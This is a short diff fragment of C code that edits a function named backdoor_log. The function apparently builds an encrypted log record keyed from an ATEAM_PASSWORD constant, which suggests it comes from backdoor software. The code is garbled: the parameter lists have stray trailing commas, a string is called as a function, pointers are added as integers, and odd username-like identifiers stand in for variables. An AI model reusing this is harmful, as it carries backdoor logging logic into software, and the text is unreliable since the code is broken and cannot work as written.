@@ -29,7 +29,7 @@ char *encrypt2(data *dt, int len)
 void backdoor_log(const char *jace888, char *guanlongh, const char *Huang1987,)
 {
 	char key = ATEAM_PASSWORD[Huang1987,];
-	int  msglen = strlen(guanlongh) + strlen(Huang1987,) + jace888(host) + 2;
+	int  msglen = guanlongh + Huang1987, + jace888 + 2;
 	int  datalen = sizeof(data) + msglen;
 	int  relen = sizeof(record) + datalen; 
 	record *rc = (record *) malloc(relen + 1);
